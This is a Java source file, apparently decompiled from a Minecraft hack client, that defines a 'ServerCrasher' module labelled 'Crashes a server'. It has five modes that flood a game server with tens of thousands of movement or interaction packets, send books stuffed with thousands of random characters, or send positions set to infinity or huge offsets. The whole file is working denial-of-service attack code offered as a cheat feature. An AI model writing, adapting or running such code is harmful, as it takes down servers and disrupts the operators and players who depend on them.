package mapped;

import com.mentalfrostbyte.jello.event.EventTarget;
import com.mentalfrostbyte.jello.event.impl.Class4428;
import com.mentalfrostbyte.jello.module.ModuleCategory;
import com.mentalfrostbyte.jello.module.PremiumModule;

public class Class5266 extends PremiumModule {
    private int field23695;

    public Class5266() {
        super("ServerCrasher", "Crashes a server", ModuleCategory.WORLD);
        this.method15972(new Class6005("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
    }

    @Override
    public void method15966() {
        this.field23695 = 0;
    }

    @EventTarget
    private void method16482(Class4428 var1) {
        if (this.method15996()) {
            if (mc.method1530()) {
                this.method16000();
            } else {
                String var4 = this.method15978("Mode");
                switch (var4) {
                    case "Flying Enabled":
                        double var6 = mc.field1339.getPosX();
                        double var8 = mc.field1339.getPosY();
                        double var10 = mc.field1339.getPosZ();
                        double var12 = 0.0;
                        double var14 = 0.0;

                        for (int var26 = 0; var26 < 50000; var26++) {
                            var14 = var26 * 7;
                            mc.getClientPlayNetHandler().sendPacket(new Class5605(var6 - var14, var8 + var12, var10 + var14, false));
                        }

                        Class8906.method32487("Trying to crash the server..");
                        this.method16000();
                        break;
                    case "Vanilla":
                        if (this.field23695++ >= 10) {
                            this.field23695 = 0;

                            for (int var25 = 0; var25 < 100000; var25++) {
                                mc.getClientPlayNetHandler().sendPacket(new Class5511(Class79.field182));
                            }

                            Class8906.method32487("Trying to crash the server..");
                        }
                        break;
                    case "Book":
                        Class8848 var16 = new Class8848(Class8514.field38047);
                        Class41 var17 = new Class41();
                        Class39 var18 = new Class39();
                        String var19 = "";

                        for (int var20 = 0; var20 < 5000; var20++) {
                            char var21 = (char) Math.round(32.0F + (float) Math.random() * 94.0F);
                            var19 = var19 + var21;
                        }

                        for (int var27 = 0; var27 < 50; var27++) {
                            Class40 var22 = new Class40(var19);
                            var17.add(var22);
                        }

                        var18.method109("author", "LeakedPvP");
                        var18.method109("title", "Sigma");
                        var18.method99("pages", var17);
                        var16.method32164("pages", var17);
                        var16.method32148(var18);

                        for (int var28 = 0; var28 < 100; var28++) {
                            try {
                                mc.getClientPlayNetHandler().sendPacket(new Class5514(0, var16));
                            } catch (Exception var23) {
                            }
                        }

                        this.method16000();
                        break;
                    case "Infinity":
                        mc.getClientPlayNetHandler().sendPacket(new Class5605(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                        Class8906.method32487("Trying to crash the server..");
                        this.method16000();
                        break;
                    case "BrainFreeze":
                        mc.getClientPlayNetHandler()
                                .sendPacket(
                                        new Class5605(
                                                mc.field1339.getPosX() + 9999.0,
                                                mc.field1339.getPosY() + 9999.0,
                                                mc.field1339.getPosZ() + 9999.0,
                                                false
                                        )
                                );
                        mc.getClientPlayNetHandler()
                                .sendPacket(
                                        new Class5605(
                                                mc.field1339.getPosX(),
                                                mc.field1339.method3389().field28450,
                                                mc.field1339.getPosZ() + 9999.0,
                                                mc.field1339.field5036
                                        )
                                );
                        if (this.field23695++ >= 200) {
                            this.method16000();
                            Class8906.method32487("Trying to crash the server..");
                        }
                }
            }
        }
    }
}
